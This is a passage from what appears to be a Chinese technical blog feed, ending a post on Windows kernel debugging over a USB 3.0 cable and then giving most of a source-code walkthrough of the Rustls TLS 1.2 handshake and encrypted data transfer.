<p>Ctrl+K，选择USB，填入目标主机配置的名字（usbdbg），确认，等待。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Microsoft (R) Windows Debugger Version 10.0.14321.1024 AMD64</span><br><span class="line">Copyright (c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Using USB for debugging</span><br><span class="line">Waiting to reconnect...</span><br><span class="line">USB: Write opened</span><br></pre></td></tr></table></figure>
<p>当将USB调试线插入host主机接口时，会自动安装相关驱动（usb2dbg等，管理员，位数等要求的原因）。</p>
<p>然后出现<code>USB: Write opened</code>表示与目标主机连接成功。</p>
<p>按下Ctrl+break，即可开始调试目标主机了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Connected to Windows 10 16299 x64 target at (Tue Dec 12 09:47:18.535 2017 (UTC + 8:00)), ptr64 TRUE</span><br><span class="line">Kernel Debugger connection established.</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       SRV*e:\symbols* http://msdl.microsoft.com/download/symbols</span><br><span class="line">Deferred                                       SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Symbol search path is: SRV*e:\symbols* http://msdl.microsoft.com/download/symbols;SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Executable search path is: </span><br><span class="line">Windows 10 Kernel Version 16299 MP (4 procs) Free x64</span><br><span class="line">Product: WinNt, suite: TerminalServer SingleUserTS</span><br><span class="line">Built by: 16299.15.amd64fre.rs3_release.170928-1534</span><br><span class="line">Machine Name:</span><br><span class="line">Kernel base = 0xfffff800`9e21d000 PsLoadedModuleList = 0xfffff800`9e57efb0</span><br><span class="line">Debug session time: Tue Dec 12 09:47:12.452 2017 (UTC + 8:00)</span><br><span class="line">System Uptime: 3 days 17:11:46.032</span><br><span class="line">WARNING: Whitespace at end of path element</span><br><span class="line"></span><br><span class="line">************* Symbol Path validation summary **************</span><br><span class="line">Response                         Time (ms)     Location</span><br><span class="line">Deferred                                       SRV*e:\symbols* http://msdl.microsoft.com/download/symbols</span><br><span class="line">Deferred                                       SRV*e:\symbols*http://msdl.microsoft.com/download/symbols</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*   You are seeing this message because you pressed either                    *</span><br><span class="line">*       CTRL+C (if you run console kernel debugger) or,                       *</span><br><span class="line">*       CTRL+BREAK (if you run GUI kernel debugger),                          *</span><br><span class="line">*   on your debugger machine&apos;s keyboard.                                      *</span><br><span class="line">*                                                                             *</span><br><span class="line">*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *</span><br><span class="line">*                                                                             *</span><br><span class="line">* If you did not intend to break into the debugger, press the &quot;g&quot; key, then   *</span><br><span class="line">* press the &quot;Enter&quot; key now.  This message might immediately reappear.  If it *</span><br><span class="line">* does, press &quot;g&quot; and &quot;Enter&quot; again.                                          *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff800`9e386c60 cc              int     3</span><br></pre></td></tr></table></figure>
<p>连接成功，设备管理中出现<code>USB Debug Connection Device</code>。</p>
<p>参考：</p>
<ol>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-a-usb-3-0-debug-cable-connection" target="_blank" rel="noopener">setting-up-a-usb-3-0-debug-cable-connection</a></li>
<li><a href="http://en.community.dell.com/techcenter/b/techcenter/archive/2014/09/30/usb3-kernel-debugging-with-dell-poweredge-13g-servers" target="_blank" rel="noopener">USB3 Kernel Debugging with Dell PowerEdge 13G Servers</a></li>
<li><a href="http://blog.techlab-xe.net/archives/1961" target="_blank" rel="noopener">http://blog.techlab-xe.net/archives/1961</a></li>
<li><a href="http://advdbg.org/blogs/advdbg_system/articles/5954.aspx" target="_blank" rel="noopener">使用USB3.0调试Windows 8</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;配置需求&quot;&gt;&lt;a href=&quot;#配置需求&quot; class=&quot;headerlink&quot; title=&quot;配置需求&quot;&gt;&lt;/a&gt;配置需求&lt;/h1&gt;&lt;p&gt;1.目标主机有USB3.0 xHCI主机控制器，支持调试&lt;br&gt;2.host主机支持USB3.0 xHCI主机控制器(使用UsbView查看)&lt;br&gt;3.USB 3.0 调试线(&lt;a href=&quot;https://www.datapro.net/products/usb-3-0-super-speed-a-a-debugging-cable.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;国外购买地址&lt;/a&gt;（可以用普通USB3.0 公对公线改造，剪掉红绿百三根线）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;先从淘宝买一根USB 3的A对A连线，有时也称公对公连线，很便宜。这根线需要加工一下才可以支持调试，加工的方法是选取线的某个位置，剥开外皮，然后把其中的红绿白三根线剪断，然后包上就可以了。USB 3电缆的线是有固定颜色的，如图3所示，&lt;br&gt;其中SDP是Shielded Differential Pair的缩写，即屏蔽起来的差分信号线，是USB 3.0的数据线，UTP是Unshielded Twisted Pair的缩写，即未屏蔽的双绞线，是USB1/2使用的数据线，所谓的D+，D-。要做的加工其实就是把2.0的三根弦剪断。剥开后，很容易找到红绿白三根，胆大心细，下剪子吧:-)。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;4.两台主机系统必须是Win8以上&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On the host computer, an xHCI (USB 3.0) host controller&lt;br&gt;On the target computer, an xHCI (USB 3.0) host controller that supports debugging&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="debug" scheme="https://anhkgg.github.io/categories/debug/"/>
    
    
      <category term="windbg" scheme="https://anhkgg.github.io/tags/windbg/"/>
    
      <category term="usb3" scheme="https://anhkgg.github.io/tags/usb3/"/>
    
      <category term="debug" scheme="https://anhkgg.github.io/tags/debug/"/>
    
      <category term="win10" scheme="https://anhkgg.github.io/tags/win10/"/>
    
  </entry>
  
  <entry>
    <title>Rustls之源码分析总结（一）</title>
    <link href="https://anhkgg.github.io/rustls-source-code-analyze/"/>
    <id>https://anhkgg.github.io/rustls-source-code-analyze/</id>
    <published>2017-11-17T05:19:50.000Z</published>
    <updated>2017-11-17T05:35:17.810Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>作者：<strong>anhkgg</strong> </li>
<li>日期：<strong>2017-11-16</strong></li>
</ul>
<p>rustls已经支持tls1.3，但是测试分析中使用的tls1.2，所以后面分析主要集中在tls1.2。</p>
<p>主要分析的源码内容：</p>
<ol>
<li>client和server的握手协议流程</li>
<li>rustls是如何进行数据传输的</li>
<li>数据传输是如何加密解密的</li>
</ol>
<a id="more"></a>
<h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><p><strong>分为client和server两部分</strong></p>
<h3 id="公共接口"><a href="#公共接口" class="headerlink" title="公共接口"></a>公共接口</h3><p><strong>session.rs</strong>定义了SessionCommon，包括了数据传输、数据加密、包处理相关接口。</p>
<p><strong>主要字段</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pub struct SessionCommon &#123;</span><br><span class="line">    pub negotiated_version: Option&lt;ProtocolVersion&gt;, //协商好的协议版本</span><br><span class="line">    pub is_client: bool, //是客户端true，是服务端false</span><br><span class="line">    message_encrypter: Box&lt;MessageEncrypter&gt;, //数据加密接口</span><br><span class="line">    message_decrypter: Box&lt;MessageDecrypter&gt;, //数据解密接口</span><br><span class="line">    key_schedule: Option&lt;KeySchedule&gt;,</span><br><span class="line">    suite: Option&lt;&amp;&apos;static SupportedCipherSuite&gt;,</span><br><span class="line">    write_seq: u64,</span><br><span class="line">    read_seq: u64,</span><br><span class="line">    peer_eof: bool,</span><br><span class="line">    pub peer_encrypting: bool,</span><br><span class="line">    pub we_encrypting: bool,</span><br><span class="line">    pub traffic: bool, // 默认false，握手完成字段为true</span><br><span class="line">    pub want_write_key_update: bool,</span><br><span class="line">    pub message_deframer: MessageDeframer, //消息帧处理对象，保存所有Message包</span><br><span class="line">    pub handshake_joiner: HandshakeJoiner,</span><br><span class="line">    pub message_fragmenter: MessageFragmenter,</span><br><span class="line">    received_plaintext: ChunkVecBuffer, //缓存接收到的数据明文</span><br><span class="line">    sendable_plaintext: ChunkVecBuffer,//缓存握手后需要传输的数据明文</span><br><span class="line">    pub sendable_tls: ChunkVecBuffer, //缓存握手数据包</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>主要接口</strong></p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td><code>read_tls</code></td>
<td>接收底层连接数据 </td>
</tr>
<tr>
<td><code>write_tls</code></td>
<td>通过底层连接发送数据</td>
</tr>
<tr>
<td><code>process_new_packets</code></td>
<td>每次调用read_tls之后都需要调用该函数主动触发消息处理</td>
</tr>
<tr>
<td><code>wants_read/wants_write</code></td>
<td>是否有数据需要接收发送</td>
</tr>
<tr>
<td><code>encrypt_outgoing</code></td>
<td>加密要发送的数据，在握手完成之后需要</td>
</tr>
<tr>
<td><code>decrypt_incoming</code></td>
<td>解密要接收的数据，在握手完成之后需要</td>
</tr>
<tr>
<td><code>send_msg_encrypt</code></td>
<td>发送加密数据</td>
</tr>
<tr>
<td><code>send_appdata_encrypt</code></td>
<td>发送握手之后的数据，加密</td>
</tr>
<tr>
<td><code>send_some_plaintext</code></td>
<td>发送明文数据，握手之后会被加密发送</td>
</tr>
<tr>
<td><code>start_traffic</code></td>
<td>握手完成之后调用，设置传输标志，发送缓存的数据明文</td>
</tr>
<tr>
<td><code>send_msg</code></td>
<td>发送TLS消息，根据是否加密走不通发送方式</td>
</tr>
<tr>
<td><code>take_received_plaintext</code></td>
<td>握手完成之后，收到数据会被调用，参数已经是明文Message</td>
</tr>
<tr>
<td><code>set_message_encrypter</code></td>
<td>设置消息加密接口，<code>start_encryption_tls12</code>中调用</td>
</tr>
<tr>
<td><code>set_message_decrypter</code></td>
<td>设置消息解密接口，<code>start_encryption_tls12</code>中调用</td>
</tr>
<tr>
<td><code>start_encryption_tls12</code></td>
<td>TLS1.2设置加解密接口，在ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle调用</td>
</tr>
</tbody>
</table>
<p><strong>ciper.rs</strong>定义了加密解密的接口。</p>
<p><code>MessageEncrypter</code>,<code>MessageDecrypter</code>，具体使用加解密方法在握手过程中ExpectTLS12ServerDone::handle/ExpectTLS12ClientKX::handle设置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//client端</span><br><span class="line">// 5e. Now commit secrets.</span><br><span class="line">let hashalg = sess.common.get_suite().get_hash();</span><br><span class="line">if st.handshake.using_ems &#123;</span><br><span class="line">    sess.secrets = Some(SessionSecrets::new_ems(&amp;st.handshake.randoms,</span><br><span class="line">                                                &amp;handshake_hash,</span><br><span class="line">                                                hashalg,</span><br><span class="line">                                                &amp;kxd.premaster_secret));</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    sess.secrets = Some(SessionSecrets::new(&amp;st.handshake.randoms,</span><br><span class="line">                                            hashalg,</span><br><span class="line">                                            &amp;kxd.premaster_secret));</span><br><span class="line">&#125;</span><br><span class="line">sess.start_encryption_tls12();</span><br><span class="line">//----------</span><br><span class="line">pub fn start_encryption_tls12(&amp;mut self, secrets: &amp;SessionSecrets) &#123;</span><br><span class="line">        let (dec, enc) = cipher::new_tls12(self.get_suite(), secrets);</span><br><span class="line">        self.message_encrypter = enc;</span><br><span class="line">        self.message_decrypter = dec;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="client详解"><a href="#client详解" class="headerlink" title="client详解"></a>client详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src/client/mod.rs 导出ClientSession接口，外部使用</span><br><span class="line">src/client/hs.rs tls协议中所有包处理，包括握手和传输</span><br></pre></td></tr></table></figure>
<p><code>ClientSession</code>内部由<code>ClientSessionImpl</code>实现。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pub struct ClientSessionImpl &#123;</span><br><span class="line">    pub config: Arc&lt;ClientConfig&gt;, //保存client端的证书，密钥配置等信息</span><br><span class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //保存握手后的会话密钥</span><br><span class="line">    pub alpn_protocol: Option&lt;String&gt;,</span><br><span class="line">    pub common: SessionCommon, // 完成具体消息传输、加解密等</span><br><span class="line">    pub error: Option&lt;TLSError&gt;,</span><br><span class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, // 保存握手过程中的交互状态，握手中处理对象都实现State接口</span><br><span class="line">    pub server_cert_chain: CertificatePayload, // 服务端证书链</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>握手，准备第一个数据包</strong>。</p>
<p><code>ClientSessionImpl::new</code>内部就会准备握手要发送的第一个数据包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cs.state = Some(hs::start_handshake(&amp;mut cs, hostname));</span><br><span class="line">//cs.state保存下一次将处理数据对象</span><br><span class="line">---&gt; //进入hs.rs</span><br><span class="line">InitialState::emit_initial_client_hello</span><br><span class="line">---&gt;</span><br><span class="line">emit_client_hello_for_retry</span><br><span class="line">---&gt; //构造发送的数据包</span><br><span class="line">let mut chp = HandshakeMessagePayload &#123;</span><br><span class="line">        typ: HandshakeType::ClientHello,</span><br><span class="line">        payload: HandshakePayload::ClientHello(ClientHelloPayload &#123;</span><br><span class="line">            client_version: ProtocolVersion::TLSv1_2,</span><br><span class="line">            random: Random::from_slice(&amp;handshake.randoms.client),</span><br><span class="line">            session_id: session_id,</span><br><span class="line">            cipher_suites: sess.get_cipher_suites(),</span><br><span class="line">            compression_methods: vec![Compression::Null],</span><br><span class="line">            extensions: exts,</span><br><span class="line">        &#125;),</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<p>然后，收到返回数据之后，会在<code>ClientSessionImpl::process_main_protocol</code>调用<code>state.handle</code>来处理收到的数据，然后返回新的state，用于下次处理，如此循环，知道握手完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fn process_main_protocol(&amp;mut self, msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</span><br><span class="line">	//检查消息是否合法</span><br><span class="line">    let state = self.state.take().unwrap();</span><br><span class="line">    state</span><br><span class="line">        .check_message(&amp;msg)</span><br><span class="line">        .map_err(|err| &#123;</span><br><span class="line">            self.queue_unexpected_alert();</span><br><span class="line">            err</span><br><span class="line">        &#125;)?;</span><br><span class="line">    //处理本次数据，返回下次需要处理的数据对象</span><br><span class="line">    self.state = Some(state.handle(self, msg)?);</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>消息处理调用流程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//ClientSessionImpl</span><br><span class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</span><br></pre></td></tr></table></figure>
<p>下面直接列出client端握手处理流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ExpectServerHelloOrHelloRetryRequest:handle </span><br><span class="line">ExpectServerHello:handle // 处理serverhello</span><br><span class="line">ExpectTLS12Certificate: handle //验证证书</span><br><span class="line">ExpectTLS12ServerKX: handle  // 密钥交换</span><br><span class="line">ExpectTLS12ServerDoneOrCertReq: handle</span><br><span class="line">ExpectTLS12ServerDone: handle</span><br><span class="line">emit_clientkx</span><br><span class="line">emit_ccs</span><br><span class="line">ExpectTLS12CCS:handle //通知使用加密方式发送报文，sess.common.peer_now_encrypting();设置后面数据会加密的状态</span><br><span class="line">emit_finished</span><br><span class="line">ExpectTLS12Finished:handle // 握手结束</span><br></pre></td></tr></table></figure>
<p>在<code>ExpectTLS12Finished::handle</code>中，会保存<code>session</code>，开始传输数据，以及返回下次的<code>state</code>，<strong>此时握手协议已经完成</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">save_session(&amp;mut st.handshake,</span><br><span class="line">             &amp;mut st.ticket,</span><br><span class="line">             sess);</span><br><span class="line"></span><br><span class="line">if st.resuming &#123;</span><br><span class="line">    emit_ccs(sess);</span><br><span class="line">    emit_finished(&amp;mut st.handshake, sess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sess.common.we_now_encrypting();</span><br><span class="line">sess.common.start_traffic(); //发送数据</span><br><span class="line">Ok(st.into_expect_tls12_traffic(fin)) // 下次需要ExpectTLS12Traffic</span><br></pre></td></tr></table></figure>
<p>后面数据传输的所有流程都会进入<code>ExpectTLS12Traffic::handle</code>，也就是开始<strong>传输协议</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">impl State for ExpectTLS12Traffic &#123;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ClientSessionImpl, mut m: Message) -&gt; StateResult &#123;</span><br><span class="line">   sess.common.take_received_plaintext(m.take_opaque_payload().unwrap());</span><br><span class="line">        Ok(self) //返回的依然是ExpectTLS12Traffic给state，所以以后都会进入这里</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>传输数据的处理</strong>。</p>
<p><strong>接收数据</strong></p>
<p>调用<code>take_received_plaintext</code>将获取到的明文Message传给内部处理，存入<code>SessionCommon</code>的<code>received_plaintext</code>，等待用户的提取。</p>
<p>那明文Message是怎么来的呢？是在前面说到的消息处理流程中，到handle之前。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process_new_packets-&gt;process_msg-&gt;process_main_protocol-&gt;state.handle</span><br></pre></td></tr></table></figure>
<p>在<code>process_msg</code>中会判断<code>peer_encrypting</code>状态为真则将数据解密，而该状态是在握手中<code>ExpectTLS12CCS::handle</code> 被设置为true的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pub fn process_msg(&amp;mut self, mut msg: Message) -&gt; Result&lt;(), TLSError&gt; &#123;</span><br><span class="line">	// Decrypt if demanded by current state.</span><br><span class="line">	if self.common.peer_encrypting &#123;</span><br><span class="line">	    let dm = self.common.decrypt_incoming(msg)?; //解密数据</span><br><span class="line">	    msg = dm;</span><br><span class="line">	&#125;</span><br><span class="line">        </span><br><span class="line">//self.common.peer_encrypting</span><br><span class="line">pub fn peer_now_encrypting(&amp;mut self) &#123;</span><br><span class="line">    self.peer_encrypting = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>发送数据</strong></p>
<p><strong>握手过程中</strong>，发送数据包使用<code>sess.common.send_msg(ch, false)</code>。<code>send_msg</code>内部根据是否加密状态（<code>must_encrypt</code>）进行不同处理，直接缓存或者调用<code>send_msg_encrypt</code>加密之后缓存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_msg_encrypt-&gt;send_single_fragment-&gt;encrypt_outgoing(加密)</span><br></pre></td></tr></table></figure>
<p>最后都是通过<code>queue_tls_message</code>将数据先缓存，然后在调用<code>write_tls</code>之后将数据发送。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pub fn write_tls(&amp;mut self, wr: &amp;mut Write) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    self.sendable_tls.write_to(wr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>握手完成后</strong>，通过<code>ClientSession</code>实现的<code>io::write</code>（或者<code>write_all</code>）接口发送明文数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">impl io::Write for ClientSession &#123;</span><br><span class="line">	//先缓存数据</span><br><span class="line">    fn write(&amp;mut self, buf: &amp;[u8]) -&gt; io::Result&lt;usize&gt;&#123;</span><br><span class="line">            self.imp.common.send_some_plaintext(buf)</span><br><span class="line">    &#125;</span><br><span class="line">	//flush时才发送数据</span><br><span class="line">    fn flush(&amp;mut self) -&gt; io::Result&lt;()&gt; &#123;</span><br><span class="line">        self.imp.common.flush_plaintext();</span><br><span class="line">        Ok(())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>send_some_plaintext</code>在根据是否握手完成有不同的操作，握手未完成时，先缓存明文到<code>sendable_plaintext</code>，握手完成后，直接调用<code>send_appdata_encrypt</code>缓存密文（进入<code>send_single_fragment</code>过程加密）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pub fn send_some_plaintext(&amp;mut self, data: &amp;[u8]) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    self.send_plain(data, Limit::Yes)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn send_plain(&amp;mut self, data: &amp;[u8], limit: Limit) -&gt; io::Result&lt;usize&gt; &#123;</span><br><span class="line">    if !self.traffic &#123; //握手未完成</span><br><span class="line">        let len = match limit &#123; //缓存明文</span><br><span class="line">            Limit::Yes =&gt; self.sendable_plaintext.append_limited_copy(data),</span><br><span class="line">            Limit::No =&gt; self.sendable_plaintext.append(data.to_vec())</span><br><span class="line">        &#125;;</span><br><span class="line">        return Ok(len);</span><br><span class="line">    &#125;</span><br><span class="line">    //握手完成，直接缓存加密数据</span><br><span class="line">    Ok(self.send_appdata_encrypt(data, limit))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>握手完成时，之前缓存的明文数据通过<code>start_traffic</code>实际将数据加密缓存到sendable_tls，最后也是通过write_tls发送出去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pub fn start_traffic(&amp;mut self) &#123;</span><br><span class="line">        self.traffic = true;</span><br><span class="line">        self.flush_plaintext();</span><br><span class="line">    &#125;</span><br><span class="line">-&gt;</span><br><span class="line">flush_plaintext-&gt;send_plain-&gt;send_appdata_encrypt-&gt;send_single_fragment-&gt; encrypt_outgoing(加密)</span><br></pre></td></tr></table></figure>
<p>握手完成之后调用的<code>send_some_plaintext</code>是直接将数据加密缓存，在write_tls后发送出去。</p>
<h3 id="server详解"><a href="#server详解" class="headerlink" title="server详解"></a>server详解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src/server/mod.rs 导出ServerSession接口，外部使用</span><br><span class="line">src/server/hs.rs tls协议中所有包处理，包括握手和传输</span><br><span class="line">src/client/</span><br></pre></td></tr></table></figure>
<p>公开外部使用的借口ServerSession，内部由ServerSessionImpl实现。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pub struct ServerSessionImpl &#123;</span><br><span class="line">    pub config: Arc&lt;ServerConfig&gt;, //证书、密钥等配置</span><br><span class="line">    pub secrets: Option&lt;SessionSecrets&gt;, //会话密钥</span><br><span class="line">    pub common: SessionCommon, // 实际握手传输数据处理对象</span><br><span class="line">    sni: Option&lt;webpki::DNSName&gt;, //SNI(Server Name Indication) ，解决一个服务器使用多个域名和证书的SSL/TLS扩展</span><br><span class="line">    pub alpn_protocol: Option&lt;String&gt;,</span><br><span class="line">    pub error: Option&lt;TLSError&gt;,</span><br><span class="line">    pub state: Option&lt;Box&lt;hs::State + Send&gt;&gt;, //握手和传输中处理数据包的状态，每个状态的数据包处理对象</span><br><span class="line">    pub client_cert_chain: Option&lt;Vec&lt;key::Certificate&gt;&gt;, //client证书链</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>接口基本和ClientSession类似，不再详述</strong></p>
<p><strong>握手流程</strong></p>
<p>server和client处理握手的方式都一样，每个握手包处理对象都会实现State接口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pub trait State &#123;</span><br><span class="line">    fn check_message(&amp;self, m: &amp;Message) -&gt; CheckResult;</span><br><span class="line">    fn handle(self: Box&lt;Self&gt;, sess: &amp;mut ServerSessionImpl, m: Message) -&gt; StateResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
